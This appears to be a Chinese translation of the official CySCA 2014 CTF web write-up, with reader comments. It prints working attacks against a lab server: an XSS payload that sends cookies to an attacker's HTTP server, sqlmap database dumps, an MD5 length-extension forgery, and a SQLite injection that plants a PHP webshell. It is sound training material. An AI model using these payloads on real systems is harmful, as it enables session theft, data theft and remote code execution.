@@ -1,0 +1,118 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">2014年澳大利亚信息安全挑战 CySCA CTF 官方write up Web篇</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">insight-labs</a> <span class="bull">·</span> <time title="2014/06/22 22:56" ui-time="" datetime="2014/06/22 22:56" class="published ng-binding ng-isolate-scope">2014/06/22 22:56</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>from:https://www.cyberchallenge.com.au/CySCA2014&#95;Web&#95;Penetration_Testing.pdf</p><h2>0x00 背景</h2><hr><p>一年一度的澳洲CySCA CTF是一个由澳洲政府和澳洲电信Telstra赞助的信息安全挑战赛，主要面向澳洲各大学的安全和计算机科学专业的学生。</p><p>CTF环境全部虚拟化并且需要openvpn才能进入。</p><h2>0x01 第一题 非请勿入</h2><hr><p>说明：</p><p>一个只有VIP用户才能进去的blog，想办法进去后就能看到flag了。</p><p>解题:</p><p>打开burp和浏览器开始观察目标，我们发现了几个有意思的地方：</p><pre><code>有个用户登录页面 login.php  
+blog导航栏里有个博客页面的链接，但是是灰色的无法点击也打不开  
+cookie有两个，PHPSESSID还有vip=0  
+cookie没有http only，有可能被xss到  
+</code></pre><p>vip=0，这有点明显，用burp或者浏览器cookie编辑工具把vip改成1，刷新页面后那个隐藏的链接可以打开了，打开后就是flag: ComplexKillingInverse411</p><h2>0x02 第二题 好吃的小甜饼</h2><hr><p>说明:</p><p>用已任何已注册用户的身份成功登录blog。</p><p>解题:</p><p>翻了翻这个博客，又发现了几个好玩的地方:</p><pre><code>可以看博客内容  
+可以添加回复  
+用户Sycamore似乎正在看第二篇博客 view=2  
+</code></pre><p>Burp的内建插件 intruder可以用来在提交的参数里插入sql注入或者xss代码，Kali中自带了几个xss和sql注入的字典:</p><pre><code>/usr/share/wfuzz/wordlist/Injections/SQL.txt   
+/usr/share/wfuzz/wordlist/Injections/XSS.txt 
+</code></pre><p>用这几个字典里的标准注入语句和xss代码对 GET view=?和 POST comment=?这两个参数过了一遍，没发现任何xss或者注入，于是我们决定对comment这个地方再仔细看看。</p><p>comment参数似乎过滤了不少东西，比如去掉了所有引号，转义了全部html特殊字符。但是似乎comment支持markdown语言里的斜体，粗体和链接标签，然后我们用burp intruder的xss测试在下面几个输入里面测试:</p><pre><code>*test*   
+*test*   
+&lt;test&gt;   
+</code></pre><p>果然成功了，在markdown链接标签的链接名称的地方存在XSS:</p><p><a href="test"></a></p><p>后续测试发现链接名称最长只能用30字符，翻了翻OWASP的XSS cheat sheet，</p><p>https://www.owasp.org/index.php/XSS&#95;Filter&#95;Evasion&#95;Cheat&#95;Sheet</p><p>最短的是这个:</p><pre><code>&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;   
+</code></pre><p>在Kali中，新建个文件 .j，里面放点偷cookie的js:</p><pre><code>$.get('http://192.168.16.101?cookie='+document.cookie);  
+</code></pre><p>然后在同目录下用python开个http服务器:</p><p>python ­-m SimpleHTTPServer 80</p><p>发送XSS payload <code>[&lt;SCRIPT SRC=//192.168.16.101/.j&gt;][1]</code></p><p>然后坐等目标上钩...<br>.<br>.<br>.<br>等了这么久怎么还没有?<br>原来是192.168.16.101这个ip太长了，payload被截断了……<br>再仔细想想，好像很多浏览器支持十进制IP的,于是我们的payload变成了:</p><pre><code>[&lt;script src=//3232239717/.j&gt;][1]   
+</code></pre><p>好吧，其实还是超过了30位，不过比赛的时候这个长度被改成了75位所以无所谓了。</p><p>发送这个payload后，过了一会儿在控制台里出现了Python HTTP Server的日志:</p><pre><code>172.16.1.80 ­ ­ [20/Feb/2014 16:11:07] "GET /.j HTTP/1.1" 200 ­   
+172.16.1.80 ­ ­ [20/Feb/2014 16:11:12] "GET   
+/?cookie=PHPSESSID=pm5qdd1636bp8o1fs92smvi916;%20vip=0 HTTP/1.1" 301
+</code></pre><p>伪造cookie刷新后拿到flag: OrganicShantyAbsent505</p><h2>0x03 第三题 Nonce-Sense</h2><hr><p>说明:</p><p>Flag在数据库里。</p><p>解题：</p><p>用上面用户的cookie登录后逛了一下，发现用户可以在自己的blog下面删除评论，这个功能是通过ajax POST到deletecomment.php实现的，提交的内容里有CSRF token。</p><p>CSRF token会被最先检查，如果不对的话会直接返回错误，这样导致对提交的参数进行自动化测试会比较困难，好在burp提供了宏这个功能，可以让我们自动采集CSRF token然后提交。</p><p>每次POST到deletecomment.php这个页面都会返回一个不同的CSRF token，下次提交的时候必须带着才行。</p><p>我们可以用burp里的session handler中的宏来抓取，我建议你先读一下这篇:</p><p>http://labs.asteriskinfosec.com.au/fuzzing-­and­-sqlmap­-inside-­csrf-­protected­-locations-­part­1/</p><p>通过SQL intruder插件，很快就可以发现在comment_id参数中存在SQL注入。</p><pre><code>{"result":false,"error":"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"' at line 1","csrf":"43b461afdd56f52f"}  
+</code></pre><p>找到注入点后，拿上顺手的SQLMAP和Burp的proxy session宏结合起来，参考这里:</p><p>http://labs.asteriskinfosec.com.au/fuzzing-­and­-sqlmap­-inside-­csrf-­protected­-locations-­part­2/</p><p>把sqlmap的请求都保存到文件里，并且确保更新session cookie</p><pre><code>#&gt; sqlmap ­r /root/sql­web3­headers ­­proxy=http://localhost:8080 ­p comment_id
+...
+[17:15:55] [WARNING] target URL is not stable. sqlmap will base the page
+comparison on a sequence matcher. If no dynamic nor injectable parameters are
+detected, or in case of junk results, refer to user's manual paragraph 'Page
+comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c
+...
+[17:16:39] [INFO] heuristic (basic) test shows that POST parameter 'comment_id'
+might be injectable (possible DBMS: 'MySQL')
+
+...
+heuristic (parsing) test showed that the back­end DBMS could be 'MySQL'. Do you
+want to skip test payloads specific for other DBMSes? [Y/n] y
+do you want to include all tests for 'MySQL' extending provided level (1) and risk
+(1)? [Y/n] n
+...
+[17:17:13] [INFO] POST parameter 'comment_id' is 'MySQL &gt;= 5.0 AND error­based ­
+WHERE or HAVING clause' injectable
+...
+POST parameter 'comment_id' is vulnerable. Do you want to keep testing the others
+(if any)? [y/N] n 
+</code></pre><p>现在我们确认了sqlmap和burp都正确配置了，接下来就可以把库拖下来了。</p><pre><code>#&gt; sqlmap ­r /root/sql­web3­headers ­­proxy=http://localhost:8080 ­p comment_id
+­­current­db
+current database:    'cysca'
+
+#&gt; sqlmap ­r /root/sql­web3­headers ­­proxy=http://localhost:8080 ­p comment_id ­D
+cysca ­­tables
+Database: cysca
+
+#&gt; sqlmap ­r /root/sql­web3­headers
+[5 tables]
++­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­---------------------------------------+
+| user                                  |
+| blogs                                 |
+| comments                              |
+| flag                                  |
+| rest_api_log                          |
++­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­---------------------------------------+
+
+#&gt; sqlmap ­r /root/sql­web3­headers ­­proxy=http://localhost:8080 ­p comment_id ­D
+cysca ­T flag ­­dump
+[1 entry]
++­­­­­­­­­­­­­­­­­­­­­­----------------------+
+| flag                 |
++­­­­­­­­­­­­­­­­­­­­­­----------------------+
+| CeramicDrunkSound667 |
++­­­­­­­­­­­­­­­­­­­­­­----------------------+
+</code></pre><p>flag: CeramicDrunkSound667</p><h2>0x04 第四题:Hypertextension</h2><hr><p>说明：</p><p>在缓存控制面板里面找到flag。</p><p>解题:</p><p>控制面板是REST API的形式，在说明文档里面写了这个API有添加文件名然后读取文件内容的功能，也许我们能用这个功能来读取PHP源码?</p><p>首先需要找到API key，在上一题里似乎数据库中有个表名叫rest&#95;api&#95;log,我们用SQLMAP把表拖下来看看:</p><pre><code>#&gt; sqlmap ­r /root/sql­web3­headers ­­proxy=http://localhost:8080 ­p comment_id ­D cysca ­T rest_api_log ­­dump
+Database: cysca
+Table: rest_api_log
+[4 entries] +­­­­+­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­ ­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­ ­+­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+
+| id | method | params
+| api_key | created_on | request_uri | +­­­­+­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­ ­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­ ­+­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+
+|1 |POST | contenttype=application%2Fpdf&amp;filepath=.%2Fdocuments%2FTop_4_Mitigations.pdf&amp;api_s ig=235aca08775a2070642013200d70097a | b32GjABvSf1Eiqry | 2014­02­21 09:27:20 | \\/api\\/documents |
+|2 |GET |_url=%2Fdocuments&amp;id=2
+| NULL
+|3 |POST | contenttype=text%2Fplain&amp;filepath=.%2Fdocuments%2Frest­api.txt&amp;api_sig=95a0e7dbe06 fb7b77b6a1980e2d0ad7d | b32GjABvSf1Eiqry | 2014­02­21 11:54:31 | \\/api\\/documents |
+|4|PUT | _url=%2Fdocuments&amp;id=3&amp;contenttype=text%2Fplain&amp;filepath=.%2Fdocuments%2Frest­api­ v2.txt&amp;api_sig=6854c04381284dac9970625820a8d32b | b32GjABvSf1Eiqry | 2014­02­21 12:07:43 | \\/api\\/documents\\/id\\/3 | +­­­­+­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­ ­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­ ­+­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+ 
+</code></pre><p>利用里面的其中一条，放到curl里面测试一下，根据REST API的文档，curl命令应该是这样的:</p><pre><code>#&gt; curl ­X PUT ­d
+'contenttype=text/plain&amp;filepath=./documents/rest­api­v2.txt&amp;api_sig=6854c04381284dac9970625820a8d32b' ­H 'X­Auth: b32GjABvSf1Eiqry'
+
+http://172.16.1.80/api/documents/id/3
+</code></pre><p>根据文档，api_sig的值是在php里面生成的:</p><pre><code>hashlib.md5(secret+'contenttypetext/plainfilepath./documents/rest­api­v2.txtid3').  
+hexdigest()  
+</code></pre><p>secret作为双方都共享的值，后面加上目标文件的路径，生成的md5 hash作为api签名，在不知道secret的情况下，似乎无法利用任意路径生成合法的签名。</p><p>但是真的是这样么?</p><p>几年前著名应用 Flickr曾经因为Hash签名使用方法不正确结果掉进了很大的坑里，那就是 Hash长度扩展攻击(Hash length extension attack),导致可以在不知道API secret的情况下伪造任意请求。</p><p>关于Flickr的坑请看这里:</p><p>http://netifera.com/research/flickr&#95;api&#95;signature_forgery.pdf</p><p>Hash长度扩展攻击能够实现是因为 foo=bar 和 fo=obar 会产生一样的hash签名，所以我们可以生成一个可以让我们在原参数后面添加新参数，并且签名还是可以通过检验的。</p><p>比如这个请求:</p><pre><code>"contenttype=text/plain&amp;filepath=./documents/rest­api­v2.txt"   
+</code></pre><p>如果我们把它改成:</p><pre><code>"c=ontenttypetext/plain&amp;filepath=./documents/rest­api­v2.txt&amp;contenttype=text/plain&amp;filepath=./index.php"  
+</code></pre><p>那么在计算hash的时候字符串就会变成这样:</p><pre><code>SECRETcontenttypetext/plainfilepath=./documents/rest­api­v2.txtcontenttype=text/plainfilepath=./index.phpid3  
+</code></pre><p>因为数据在被hash的时候会被分割成固定长度的块，前面的块生成的hash会放入下一个块中和块的内容一起继续hash，直到最后一个块，最后一个块生成的hash就是我们最后得到的hash，也就是前面的api_sig。</p><p>现在我们知道了前面所有块产生的hash，如果我们自己再造一个块，把这个hash当成前面的块的hash放进我们自己建立的块中来hash一下会发生什么?</p><p>结果我们在不知道secret的情况下获得了可以在原文后添加任意内容并且产生合法hash的方法。</p><p>大部分web server在处理同样参数的不同内容时倾向于选择后面的，例如foo=1&amp;foo=2，最后foo的值是2，但是有些web server也会使用前面的，这样这个方法是不是就不能用了?</p><p>根据这个API的文档，参数和值会拼接在一起然后一起hash，例如，foo=bar&amp;foo1=bar1会被变成字符串foobarfoo1bar1，所以假如我们把foo=bar变成fo=obar，拼接后的字符串还是foobarfoo1bar，这样我们就可以完全控制需要更改的参数了。</p><p>现在开始利用这个漏洞，首先下载并且编译工具 HashPump (https://github.com/bwall/HashPump)，然后利用它来生成我们需要的hash。因为我们不知道secret的长度，所以需要穷举key的长度(hashpump的k参数)</p><pre><code>#&gt; ./hashpump ­s 6854c04381284dac9970625820a8d32b ­­data
+contenttypetext/plainfilepath./documents/rest­api­v2.txtid3 ­a
+contenttypetext/plainfilepath./index.phpid3 ­k 16
+4625e458d07cb19da70effa3d1c6dc14
+contenttypetext/plainfilepath./documents/rest­api­v2.txtid3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00X\x02\x00\x00\x00\x00\x00\x00contenttypetext/plainfilepath./index.phpid3 
+</code></pre><p>我们把每次尝试k值生成的hash和字符串用curl提交到服务器，直到服务器提示成功为止，经过多次测试，我们发现k值是16.</p><pre><code>#&gt; curl ­-X PUT -­d
+'c=ontenttypetext/plainfilepath./documents/rest­api­v2.txtid3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%02%00%00%00%00%00%00&amp;contenttype=text/plain&amp;filepath=./index.php&amp;api_sig=4625e458d07cb19da70effa3d1c6dc14'  ­H 'X­Auth:b32GjABvSf1Eiqry' http://172.16.1.80/api/documents/id/3
+</code></pre><p>接下来我们就成功获取了index.php的源码(成功的把index.php的源码作为document id 3 保存):</p><pre><code>#&gt; curl http://172.16.1.80/api/documents/id/3
+&lt;?php
+// Not in production... see /cache.php?access=&lt;secret&gt;
+include('../lib/caching.php');
+if (isset($_GET['debug'])) {
+readFromCache();
+}
+**** SNIP **** 
+</code></pre><p>似乎这个cache.php有点意思，我们改改上面的hash长度攻击利用代码，把index.php换成cache.php,这次我们成功的拿到了flag。</p><pre><code>#&gt; curl http://172.16.1.80/api/documents/id/3
+**** SNIP ****
+$flag = 'OrganicPamperSenator877';
+if ($_GET['access'] != md5($flag)) {
+header('Location: /index.php');
+die();
+}
+**** SNIP **** 
+</code></pre><h2>0x05 第五题:注入空间 Injeption（尼玛真难翻译）</h2><hr><p>说明:</p><p>Web篇最后的flag藏在 /flag.txt里，你能拿到么?</p><p>解题:</p><p>上一题cache.php里面的源码最后写了，提交的参数access的值必须是上一题flag的md5，浏览器打开cache.php?access=f4fa5dc42fd0b12a098fcc218059e061 显示的是一个很简单的表单，表单提交了两个参数，URI和标题，在cache.php里面对这两个参数严格检查，比如URI参数前面必须是http://开头，服务器必须是本地，然后这个URI必须真实存在，不能是404.</p><p>标题被限制在40字符以内，但是不会过滤引号，似乎可以被注入。</p><p>我们尝试在标题里提交 /* ,返回了错误信息:</p><pre><code>near "/*', '59ab7c9e3917a154ff56a43d08a262ab','http%3A%2F%2F172.16.1.80%2Findex.php', '...', datetime('now'))": syntax error
+</code></pre><p>熟悉的SQL显错注入,根据错误信息，后端数据库似乎是SQLite，通过查看lib/caching.php的源码我们可以确认这一点，通过源码我们还可以看出，URI所指向的页面内容被直接存进了数据库中。</p><p>考虑到40个字符的限制不能进行任何有利用价值的SQL注入，我们需要找到一个可以注入长字符串的方法，页面内容输出缓存的功能现在派上用场了。</p><p>幸运的是，我们可以控制并且注入没转义过的单引号到缓存页面，并且把缓存页面自己缓存了，把在标题中的几个较短的注入语句拼接在一起，一个完整的注入语句就能在缓存页面被存入数据库的时候执行。</p><p>这里有个很好用的SQLite注入 cheat sheet，可以直接通过注入拿shell!</p><p>http://atta.cked.me/home/sqlite3injectioncheatsheet</p><p>我们的目标是利用这段注入语句拿到shell:</p><pre><code>',0); ATTACH DATABASE 'a.php' AS a; CREATE TABLE a.b (c text); INSERT INTO a.b VALUES ('&lt;? system($_GET[''cmd'']); ?&gt;');/* 
+</code></pre><p>我们如何用40个字符的长度注入122字符的SQL语句? SQL块注释!</p><p>这需要一些额外的转义并且把php的拼接指令'||'分开：</p><pre><code>'',0);ATTACH DATABASE ''a.php'' AS a;/*
+*/CREATE TABLE a.b (c text);INSERT /*
+*/INTO a.b VALUES(''&lt;? system($''||/*
+*/''_GET[''''cmd'''']); ?&gt;'');/*
+</code></pre><p>当这些标题一个个出现在缓存页面中的时候，我们把缓存页面给缓存了，我们的注入语句就被执行了，并且生成了webshell a.php</p><p>我们现在就可以在服务器上执行任意指令了! 比如 cat /flag.txt</p><pre><code># &gt; curl http://172.16.1.80/a.php?cmd=cat+/flag.txt   
+</code></pre><p>CFlag: TryingCrampFibrous963</p><p>Web篇完结。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">abaddon</span> <span class="reply-time">2014-08-12 15:50:00</span></div><p></p><p>BCTF对于第一次接触者方面的新人是比较虐心的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌云一哥</span> <span class="reply-time">2014-07-01 11:48:04</span></div><p></p><p>果然是针对入门基本的学生们。。。难度没BCTF大</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小lu</span> <span class="reply-time">2014-06-26 23:05:02</span></div><p></p><p>Telstra么，他们应急响应中心有非常多的数据库高手我会告诉你？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">千域千寻</span> <span class="reply-time">2014-06-26 11:31:41</span></div><p></p><p>大牛们还有这样的CTF类的平台么？或者是环境和文档，给个链接我去搜搜去··· : )</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DM_</span> <span class="reply-time">2014-06-26 00:01:41</span></div><p></p><p>https://gist.github.com/McSimp/2602fd7ee7203e34268b<br>顺带着参考这个看看，这个也不错。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">F1uYu4n</span> <span class="reply-time">2014-06-25 23:36:23</span></div><p></p><p>[code][&lt;script src=//3232239717/.j&gt;][/code][1]</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">F1uYu4n</span> <span class="reply-time">2014-06-25 23:35:29</span></div><p></p><p>[][1]<br>应该是<br>[](1)<br>吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Roar</span> <span class="reply-time">2014-06-24 19:06:08</span></div><p></p><p>O(∩_∩)O哈哈~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1c3z</span> <span class="reply-time">2014-06-24 18:58:12</span></div><p></p><p>CySCA2014InABox下载地址，官网给的好难下！！<br>http://download.vulnhub.com/cysca/CySCA2014InABox.7z</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">胖小二</span> <span class="reply-time">2014-06-23 23:04:37</span></div><p></p><p>“0x04 第四题:Hypertextension”题的填充数据不对吧，最后32位应该是填充长度，怎么都是“\x00”？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">摸摸</span> <span class="reply-time">2014-06-23 22:23:08</span></div><p></p><p>为什么MD5长度扩展攻击的填充会出现“\x00X \x02”？？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-06-23 09:38:33</span></div><p></p><p>：）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2014-06-23 09:02:17</span></div><p></p><p>原题就叫Injeption，意思为inception和injection的结合。</p><p>起这个名字用意在于需要用多个短注入语句拼出长注入语句，并且要把缓存页面再次缓存(就像梦里做梦有木有)</p><p>其实这个CTF出题者命名很有创意的，你们不要黑他</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mramydnei</span> <span class="reply-time">2014-06-23 02:48:53</span></div><p></p><p>虽然难度系数不高，但感觉没有某些CTF那么YY</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-06-23 02:18:45</span></div><p></p><p>第五题:注入空间 Injeption（尼玛真难翻译）<br>尼玛！尼玛！尼玛！injection吧！这都识别不出啊！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Bloodwolf</span> <span class="reply-time">2014-06-23 01:40:06</span></div><p></p><p>+10086</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">luwikes</span> <span class="reply-time">2014-06-23 00:33:27</span></div><p></p><p>不错～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">懒懒滴1994</span> <span class="reply-time">2014-06-22 23:40:51</span></div><p></p><p>2楼，赞一个</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-06-22 22:59:07</span></div><p></p><p>这比赛官方提供虚拟机环境：https://www.cyberchallenge.com.au/inabox.html<br>其他write up见<br>https://www.cyberchallenge.com.au/solutions.html<br>drops同样收其它译文 :)</p><p></p></div></div></div></div></div></main>
